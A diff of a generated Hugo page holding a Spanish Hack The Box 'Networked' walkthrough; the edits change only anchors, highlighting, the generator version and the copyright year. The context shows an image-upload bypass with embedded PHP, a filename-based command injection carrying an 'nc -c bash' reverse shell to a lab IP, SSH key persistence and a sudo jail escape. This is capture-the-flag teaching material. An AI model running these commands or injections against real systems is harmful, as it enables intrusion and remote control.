@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="Walkthrough :: Writeups de rooms y maquinas de TryHackMe, HackTheBox y CTFs, en español">
   
 
-<meta name="generator" content="Hugo 0.79.1" />
+<meta name="generator" content="Hugo 0.68.3" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1629,7 +1629,7 @@
 </tbody>
 </table>
 <hr />
-<h2 id="masscan--nmap">MASSCAN &amp; NMAP</h2>
+<h2 id="masscan--nmap-">MASSCAN &amp; NMAP</h2>
 <p>Escaneo de puertos tcp/udp con masscan y nmap.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1687,12 +1687,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 <span class="c1"># Nmap done at Tue Aug 27 22:49:14 2019 -- 1 IP address (1 host up) scanned in 10.16 seconds</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="http">HTTP</h2>
+</div><h2 id="http-">HTTP</h2>
 <p>Visitamos la pagina que se encuentra en el puerto 80 y nos muestra lo siguiente.</p>
 <p><img src="/images/posts/htb/networked/Screenshot%20from%202019-08-27%2021.12.11.webp" alt="image" /></p>
 <p>Ademas de eso en el codigo fuente nos muestra un comentario relacionado a una galeria.</p>
 <p><img src="/images/posts/htb/networked/Screenshot%20from%202019-08-27%2021.12.57.webp" alt="image" /></p>
-<h2 id="dirbuster">DIRBUSTER</h2>
+<h2 id="dirbuster-">DIRBUSTER</h2>
 <p>Utilizamos dirbuster para busqueda de direcotrios y paginas.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1756,11 +1756,11 @@ by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span 
 <span class="o">===============================================================</span>
 </code></pre></td></tr></table>
 </div>
-</div><h3 id="backup---backuptar">BACKUP - backup.tar</h3>
+</div><h3 id="backup---backuptar-">BACKUP - backup.tar</h3>
 <p>Visitamos la pagina backup y encontramos un archivo &lsquo;backup.tar&rsquo; que al extraer los archivos que contiene nos muestra el codigo fuente de las paginas que encontramos con dirbuster.</p>
 <p><img src="/images/posts/htb/networked/Screenshot%20from%202019-08-27%2021.14.46.webp" alt="image" /></p>
 <p>Analizamos el codigo fuente de los archivos, encontramos que, en la pagina upload.php podemos subir archivos de los cuales solo archivos de tipo imagen estan permitidos.</p>
-<h3 id="bypass---upload-shell">BYPASS - Upload Shell</h3>
+<h3 id="bypass---upload-shell-">BYPASS - Upload Shell</h3>
 <p>Utilizamos exiftool para añadir codigo php para ejecucion de comandos en una de las imagenes que descargamos de photos.php, luego de esto cambiamos el nombre del archivo y le añadimos <code>.php.jpg</code> como extension.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1786,7 +1786,7 @@ mv 127.jpg 127.php.jpg
 </code></pre></td></tr></table>
 </div>
 </div><p>Obtenemos nuestra shell como usuario apache.</p>
-<h2 id="usuario---guly">USUARIO - guly</h2>
+<h2 id="usuario---guly-">USUARIO - guly</h2>
 <p>Dentro de los archivos que encontramos en la carpeta principal del usuario guly, de los cuales podemos leer solo dos, vemos un archivo de tipo cronjob y uno de php.</p>
 <p><img src="/images/posts/htb/networked/Screenshot%20from%202019-08-27%2023.06.21.webp" alt="image" /></p>
 <p>El archivo cron se encarga de ejecutar el comando <strong>php /home/guly/check_attack.php</strong> cada 3 mins.</p>
@@ -1797,8 +1797,8 @@ mv 127.jpg 127.php.jpg
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;rm -f </span><span class="si">$logpath</span><span class="s2">&#34;</span><span class="p">);</span>
-<span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;nohup /bin/rm -f </span><span class="si">$path$value</span><span class="s2"> &gt; /dev/null 2&gt;&amp;1 &amp;&#34;</span><span class="p">);</span>
+<pre class="chroma"><code class="language-php" data-lang="php">exec(&#34;rm -f $logpath&#34;);
+exec(&#34;nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;<span class="err">&amp;</span>1 <span class="ni">&amp;&#34;);</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Las variables que nos interesan son:</p>
@@ -1808,8 +1808,8 @@ mv 127.jpg 127.php.jpg
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$path</span> <span class="o">=</span> <span class="s1">&#39;/var/www/html/uploads/&#39;</span><span class="p">;</span>
-<span class="nv">$logpath</span> <span class="o">=</span> <span class="s1">&#39;/tmp/attack.log&#39;</span><span class="p">;</span>
+<pre class="chroma"><code class="language-php" data-lang="php">$path = &#39;/var/www/html/uploads/&#39;;
+$logpath = &#39;/tmp/attack.log&#39;;
 </code></pre></td></tr></table>
 </div>
 </div><p>Sabiendo esto vamos a aprovechar la segunda ejecucion de comandos, en la cual se le pasa los parametros:</p>
@@ -1830,7 +1830,7 @@ mv 127.jpg 127.php.jpg
 <pre class="chroma"><code class="language-bash" data-lang="bash"><span class="p">;</span> nc -c bash 10.10.15.129 <span class="m">1338</span>
 </code></pre></td></tr></table>
 </div>
-</div><h4 id="touch">Touch</h4>
+</div><h4 id="touch-">Touch</h4>
 <p><img src="/images/posts/htb/networked/Screenshot%20from%202019-08-27%2023.03.39.webp" alt="image" /></p>
 <p>Y para cuando el cron se active y ejecute el archivo y, al borrar nuestro archivo va a ejecutar lo siguiente:</p>
 <div class="highlight"><div class="chroma">
@@ -1843,10 +1843,10 @@ mv 127.jpg 127.php.jpg
 </div>
 </div><p>Por lo que va a ejecutar nuestra shell inversa y obtenemos nuestra bandera <strong>user.txt</strong>.</p>
 <p><img src="/images/posts/htb/networked/Screenshot%20from%202019-08-27%2023.04.04.webp" alt="image" /></p>
-<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>
+<h2 id="privilege-escalation-">PRIVILEGE ESCALATION</h2>
 <p>Agregamos nuestra clave a authorized_keys del usuario guly y nos logeamos al servicio ssh. Ejecutamos el comando <code>sudo -l -l</code> y nos muestra un archivo que se ejecuta como usuario root.</p>
 <p><img src="/images/posts/htb/networked/Screenshot%20from%202019-08-27%2023.27.27.webp" alt="image" /></p>
-<h3 id="jail-escaping-bash">Jail Escaping Bash</h3>
+<h3 id="jail-escaping-bash-">Jail Escaping Bash</h3>
 <p>Utilizamos la &ldquo;tecnica&rdquo; para escapar de una shell bash. Para ello al preguntarnos sobre las variables le pasamos un comando el cual va a ejecutar.</p>
 <p><a href="http://blog.dornea.nu/2016/06/20/ringzer0-ctf-jail-escaping-bash/#63664aa8bee7544118de87bf48d529ee"><strong>Jail Escaping Bash</strong></a></p>
 <div class="highlight"><div class="chroma">
@@ -3226,7 +3226,7 @@ document.addEventListener('DOMContentLoaded', function () {
             <p class="caption">
                 
                     
-                        ©2020, All Rights Reserved
+                        ©2021, All Rights Reserved
                     
                 
             </p>
@@ -3274,22 +3274,22 @@ document.addEventListener('DOMContentLoaded', function () {
             <li><a href="#informacion-de-la-maquina">Informacion de la Maquina</a></li>
           </ul>
         </li>
-        <li><a href="#masscan--nmap">MASSCAN &amp; NMAP</a></li>
-        <li><a href="#http">HTTP</a></li>
-        <li><a href="#dirbuster">DIRBUSTER</a>
+        <li><a href="#masscan--nmap-">MASSCAN &amp; NMAP</a></li>
+        <li><a href="#http-">HTTP</a></li>
+        <li><a href="#dirbuster-">DIRBUSTER</a>
           <ul>
-            <li><a href="#backup---backuptar">BACKUP - backup.tar</a></li>
-            <li><a href="#bypass---upload-shell">BYPASS - Upload Shell</a></li>
+            <li><a href="#backup---backuptar-">BACKUP - backup.tar</a></li>
+            <li><a href="#bypass---upload-shell-">BYPASS - Upload Shell</a></li>
           </ul>
         </li>
-        <li><a href="#usuario---guly">USUARIO - guly</a>
+        <li><a href="#usuario---guly-">USUARIO - guly</a>
           <ul>
             <li></li>
           </ul>
         </li>
-        <li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a>
+        <li><a href="#privilege-escalation-">PRIVILEGE ESCALATION</a>
           <ul>
-            <li><a href="#jail-escaping-bash">Jail Escaping Bash</a></li>
+            <li><a href="#jail-escaping-bash-">Jail Escaping Bash</a></li>
           </ul>
         </li>
       </ul>
